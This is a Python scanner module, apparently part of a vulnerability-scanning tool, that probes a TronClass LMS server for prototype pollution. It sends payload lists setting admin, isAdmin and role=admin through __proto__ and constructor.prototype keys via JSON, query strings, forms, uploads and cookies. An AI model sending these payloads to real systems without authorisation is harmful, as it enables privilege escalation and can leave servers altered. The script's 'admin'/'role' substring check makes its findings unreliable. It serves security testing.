"""
CVE-2022-25869 Vulnerability Detection Script
Prototype pollution vulnerability detection for TronClass LMS
"""

import requests
import json
from urllib.parse import urljoin

def scan(session, target_url):
    """
    Scan for CVE-2022-25869 vulnerability
    Prototype pollution vulnerability in JavaScript/Node.js applications
    """
    result = {
        'vulnerable': False,
        'evidence': '',
        'description': 'CVE-2022-25869: Prototype pollution vulnerability in JavaScript object processing',
        'remediation': 'Update vulnerable dependencies, implement object property validation, and use Map instead of Object'
    }
    
    try:
        # Check for JavaScript/Node.js application
        response = session.get(target_url, timeout=30)
        
        js_indicators = [
            'node.js',
            'express',
            'angular',
            'react',
            'vue',
            'lodash',
            'jquery',
            'application/json',
            'Content-Type: application/json'
        ]
        
        uses_javascript = any(indicator in response.text.lower() for indicator in js_indicators)
        
        if not uses_javascript:
            result['evidence'] = "JavaScript application not detected"
            return result
        
        # Prototype pollution payloads
        prototype_payloads = [
            {'__proto__': {'admin': True}},
            {'__proto__': {'isAdmin': True}},
            {'__proto__': {'role': 'admin'}},
            {'__proto__': {'authenticated': True}},
            {'constructor': {'prototype': {'admin': True}}},
            {'constructor': {'prototype': {'isAdmin': True}}},
            {'constructor': {'prototype': {'role': 'admin'}}},
            {'prototype': {'admin': True}},
            {'prototype': {'isAdmin': True}},
            {'prototype': {'role': 'admin'}},
            {'__proto__.admin': True},
            {'__proto__.isAdmin': True},
            {'__proto__.role': 'admin'},
            {'__proto__.authenticated': True}
        ]
        
        # Test endpoints for prototype pollution
        test_endpoints = [
            '/api/user',
            '/api/profile',
            '/api/settings',
            '/api/config',
            '/api/data',
            '/api/update',
            '/api/create',
            '/profile/update',
            '/settings/update',
            '/user/update',
            '/config/update'
        ]
        
        for endpoint in test_endpoints:
            for payload in prototype_payloads:
                try:
                    headers = {'Content-Type': 'application/json'}
                    response = session.post(
                        urljoin(target_url, endpoint),
                        json=payload,
                        headers=headers,
                        timeout=30
                    )
                    
                    # Check for successful prototype pollution
                    if response.status_code == 200:
                        # Test if the pollution worked by checking subsequent requests
                        test_response = session.get(urljoin(target_url, '/api/user'), timeout=30)
                        
                        if 'admin' in test_response.text.lower() or 'role' in test_response.text.lower():
                            result['vulnerable'] = True
                            result['evidence'] = f"Prototype pollution detected at {endpoint} with payload: {payload}"
                            return result
                            
                except:
                    continue
        
        # Test for query parameter prototype pollution
        query_payloads = [
            '?__proto__[admin]=true',
            '?__proto__[isAdmin]=true',
            '?__proto__[role]=admin',
            '?constructor[prototype][admin]=true',
            '?constructor[prototype][isAdmin]=true',
            '?constructor[prototype][role]=admin',
            '?prototype[admin]=true',
            '?prototype[isAdmin]=true',
            '?prototype[role]=admin'
        ]
        
        for endpoint in test_endpoints:
            for payload in query_payloads:
                try:
                    response = session.get(urljoin(target_url, endpoint + payload), timeout=30)
                    
                    if response.status_code == 200:
                        # Check for signs of successful pollution
                        test_response = session.get(urljoin(target_url, '/api/user'), timeout=30)
                        
                        if 'admin' in test_response.text.lower():
                            result['vulnerable'] = True
                            result['evidence'] = f"Query parameter prototype pollution detected at {endpoint} with payload: {payload}"
                            return result
                            
                except:
                    continue
        
        # Test for form data prototype pollution
        form_payloads = [
            {'__proto__[admin]': 'true'},
            {'__proto__[isAdmin]': 'true'},
            {'__proto__[role]': 'admin'},
            {'constructor[prototype][admin]': 'true'},
            {'constructor[prototype][isAdmin]': 'true'},
            {'constructor[prototype][role]': 'admin'},
            {'prototype[admin]': 'true'},
            {'prototype[isAdmin]': 'true'},
            {'prototype[role]': 'admin'}
        ]
        
        for endpoint in test_endpoints:
            for payload in form_payloads:
                try:
                    response = session.post(
                        urljoin(target_url, endpoint),
                        data=payload,
                        timeout=30
                    )
                    
                    if response.status_code == 200:
                        # Check for successful pollution
                        test_response = session.get(urljoin(target_url, '/api/user'), timeout=30)
                        
                        if 'admin' in test_response.text.lower():
                            result['vulnerable'] = True
                            result['evidence'] = f"Form data prototype pollution detected at {endpoint} with payload: {payload}"
                            return result
                            
                except:
                    continue
        
        # Test for nested prototype pollution
        nested_payloads = [
            {'user': {'__proto__': {'admin': True}}},
            {'settings': {'__proto__': {'isAdmin': True}}},
            {'config': {'__proto__': {'role': 'admin'}}},
            {'data': {'constructor': {'prototype': {'admin': True}}}},
            {'profile': {'prototype': {'isAdmin': True}}},
            {'options': {'__proto__': {'authenticated': True}}}
        ]
        
        for endpoint in test_endpoints:
            for payload in nested_payloads:
                try:
                    headers = {'Content-Type': 'application/json'}
                    response = session.post(
                        urljoin(target_url, endpoint),
                        json=payload,
                        headers=headers,
                        timeout=30
                    )
                    
                    if response.status_code == 200:
                        # Check for successful pollution
                        test_response = session.get(urljoin(target_url, '/api/user'), timeout=30)
                        
                        if 'admin' in test_response.text.lower():
                            result['vulnerable'] = True
                            result['evidence'] = f"Nested prototype pollution detected at {endpoint} with payload: {payload}"
                            return result
                            
                except:
                    continue
        
        # Test for prototype pollution in file uploads
        upload_endpoints = ['/upload', '/api/upload', '/file/upload']
        
        for endpoint in upload_endpoints:
            try:
                # Test multipart form data with prototype pollution
                files = {
                    'file': ('test.txt', 'test content', 'text/plain'),
                    '__proto__[admin]': (None, 'true')
                }
                
                response = session.post(
                    urljoin(target_url, endpoint),
                    files=files,
                    timeout=30
                )
                
                if response.status_code == 200:
                    # Check for successful pollution
                    test_response = session.get(urljoin(target_url, '/api/user'), timeout=30)
                    
                    if 'admin' in test_response.text.lower():
                        result['vulnerable'] = True
                        result['evidence'] = f"File upload prototype pollution detected at {endpoint}"
                        return result
                        
            except:
                continue
        
        # Test for prototype pollution in cookie parsing
        cookie_payloads = [
            '__proto__[admin]=true',
            '__proto__[isAdmin]=true',
            '__proto__[role]=admin',
            'constructor[prototype][admin]=true'
        ]
        
        for payload in cookie_payloads:
            try:
                headers = {'Cookie': payload}
                response = session.get(
                    urljoin(target_url, '/api/user'),
                    headers=headers,
                    timeout=30
                )
                
                if response.status_code == 200:
                    if 'admin' in response.text.lower():
                        result['vulnerable'] = True
                        result['evidence'] = f"Cookie-based prototype pollution detected with payload: {payload}"
                        return result
                        
            except:
                continue
        
        # Test for prototype pollution in URL-encoded data
        urlencoded_payloads = [
            '__proto__[admin]=true&username=test',
            '__proto__[isAdmin]=true&password=test',
            '__proto__[role]=admin&email=test@test.com',
            'constructor[prototype][admin]=true&user=test'
        ]
        
        for endpoint in test_endpoints:
            for payload in urlencoded_payloads:
                try:
                    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
                    response = session.post(
                        urljoin(target_url, endpoint),
                        data=payload,
                        headers=headers,
                        timeout=30
                    )
                    
                    if response.status_code == 200:
                        # Check for successful pollution
                        test_response = session.get(urljoin(target_url, '/api/user'), timeout=30)
                        
                        if 'admin' in test_response.text.lower():
                            result['vulnerable'] = True
                            result['evidence'] = f"URL-encoded prototype pollution detected at {endpoint} with payload: {payload}"
                            return result
                            
                except:
                    continue
                    
    except Exception as e:
        result['evidence'] = f"Error during scan: {str(e)}"
    
    return result